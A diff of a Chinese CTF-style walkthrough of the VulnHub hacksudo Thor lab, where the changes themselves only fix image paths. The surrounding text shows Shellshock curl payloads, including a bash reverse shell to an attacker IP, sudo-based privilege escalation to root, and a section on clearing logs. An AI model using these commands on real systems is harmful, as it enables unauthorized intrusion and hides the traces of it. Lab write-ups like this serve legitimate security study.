@@ -10,13 +10,13 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\1.jpg)
+![](./pic-thor/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\2.jpg)
+![](./pic-thor/2.jpg)
 
 - 21端口ftp服务可能打开
 - 22端口ssh服务
@@ -26,41 +26,41 @@
 
 访问80端口，只有一个登录界面
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\3.jpg)
+![](./pic-thor/3.jpg)
 
 查看页面源代码内容，这里页面源代码内容可能不是详细，所以以调式查看，发现一个点击会触发`JS`代码
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\4.jpg)
+![](./pic-thor/4.jpg)
 
 查看当前有无该内容，找到函数，不过在其上方的内容值得关注
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\5.jpg)
+![](./pic-thor/5.jpg)
 
 也就是在JS函数中，调用了上面的内容，当快速点击`logo`很多次时触发
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\6.jpg)
+![](./pic-thor/6.jpg)
 
 翻译其英文，发现一个名称`georgie`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\7.jpg)
+![](./pic-thor/7.jpg)
 
 不过源代码中也确定了网站为目录型网站，脚本语言`php`
 
 使用`gobuster、ffuf、dirsearch、dirb、dirbuster`等工具扫描目录
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\8.jpg)
+![](./pic-thor/8.jpg)
 
 查看`README.md`文件，为了方便展示，这里截图截取重要信息，并为了理解，翻译成中文
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\9.jpg)
+![](./pic-thor/9.jpg)
 
 访问`admin_login.php`，确定不一样的登录界面
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\10.jpg)
+![](./pic-thor/10.jpg)
 
 访问`contact.php`，发现两个名称，记录下
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\11.jpg)
+![](./pic-thor/11.jpg)
 
 想着使用`cewl`爬取，来充当字典，但是这个有点多
 
@@ -75,11 +75,11 @@
 
 测试发现，在`admin_login.php`中，以`admin`登录成功，测试功能，发现有用户管理，发现了几个用户，好家伙，我是一个都没猜中
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\12.jpg)
+![](./pic-thor/12.jpg)
 
 看一下和`README.md`的是否一样，不过查看后，发现只有一个用户名是这样设置的
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\13.jpg)
+![](./pic-thor/13.jpg)
 
 以这四个用户登录`home.php`，看有什么不一样，测试后发现无差别，`admin`可以操作所有。
 
@@ -87,7 +87,7 @@
 
 查看项目源码，也是没发现什么，然后，看了网上的wp，我服啦，在`news.php`页面源代码中有`cgi-gin`，我当时还查看了页面源代码，但是没有发现，但是以开发者工具打开，一眼就看见了，啧，烦
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\14.jpg)
+![](./pic-thor/14.jpg)
 
 # 漏洞寻找
 
@@ -97,7 +97,7 @@
 gobuster dir -u http://192.168.1.54 -w /usr/share/wordlists/dirb/big.txt -x php,zip,md,txt,tar -b 404
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\15.jpg)
+![](./pic-thor/15.jpg)
 
 继续扫描`cgi-bin`目录下有无可用
 
@@ -105,7 +105,7 @@ gobuster dir -u http://192.168.1.54 -w /usr/share/wordlists/dirb/big.txt -x php,
 gobuster dir -u http://192.168.1.54/cgi-bin -w /usr/share/wordlists/dirb/big.txt -x php,zip,md,txt,cgi,sh -b 404
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\16.jpg)
+![](./pic-thor/16.jpg)
 
 使用`nmap`中的脚本进行检测，nmap中的一些漏洞检测都是可以的
 
@@ -115,11 +115,11 @@ nmap -sV -O 192.168.1.54 -p80 --script=http-shellshock --script-args uri=/cgi-bi
 
 
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\17.jpg)
+![](./pic-thor/17.jpg)
 
 再测试`shell.sh`是否可利用，也是可用的
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\18.jpg)
+![](./pic-thor/18.jpg)
 
 使用`searchsploit`发现有脚本可用，但是是`msf`中的，这个尽量不依赖`msf`，所以这里另择方法
 
@@ -131,7 +131,7 @@ nmap -sV -O 192.168.1.54 -p80 --script=http-shellshock --script-args uri=/cgi-bi
 curl -v http://192.168.1.54/cgi-bin/shell.sh -H "Referer:() { test; }; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\19.jpg)
+![](./pic-thor/19.jpg)
 
 # 漏洞利用
 
@@ -141,25 +141,25 @@ curl -v http://192.168.1.54/cgi-bin/shell.sh -H "Referer:() { test; }; echo 'Con
 curl -v http://192.168.1.54/cgi-bin/shell.sh -H "Referer:() { test; }; echo 'Content-Type: text/plain'; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.16/9999 0>&1';exit"
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\20.jpg)
+![](./pic-thor/20.jpg)
 
 # 靶机内信息收集
 
 之前有一个`connect.php`文件，说是连接数据库的，切换到网站目录
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\21.jpg)
+![](./pic-thor/21.jpg)
 
 查看网络状态
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\22.jpg)
+![](./pic-thor/22.jpg)
 
 查看备份目录以及有哪些用户
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\23.jpg)
+![](./pic-thor/23.jpg)
 
 寻找具有SUID权限的文件，发现`sudo`，并且还不需要输入密码就可以使用，不过用户非`root`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\24.jpg)
+![](./pic-thor/24.jpg)
 
 # 提权
 
@@ -167,11 +167,11 @@ curl -v http://192.168.1.54/cgi-bin/shell.sh -H "Referer:() { test; }; echo 'Con
 
 以身份`thor`的`sudo`权限执行，发现是一次性的
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\25.jpg)
+![](./pic-thor/25.jpg)
 
 那么`id`可用，直接使用`bash`能否吊起一个`thor`的终端，发现可以，成功为`thor`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\26.jpg)
+![](./pic-thor/26.jpg)
 
 
 
@@ -183,7 +183,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 然后直接使用`sudo -l`测试，毕竟之前都无需密码，测试一下，发现也不需要，并且两个`root`的文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\27.jpg)
+![](./pic-thor/27.jpg)
 
 ## 提权至root
 
@@ -191,17 +191,17 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 用法`sudo service ../../bin/sh`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\28.jpg)
+![](./pic-thor/28.jpg)
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\29.jpg)
+![](./pic-thor/29.jpg)
 
 # 清除痕迹
 
 各种日志
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\30.jpg)
+![](./pic-thor/30.jpg)
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-thor\31.jpg)
+![](./pic-thor/31.jpg)
 
 若是上传了文件什么的，改回即可
 
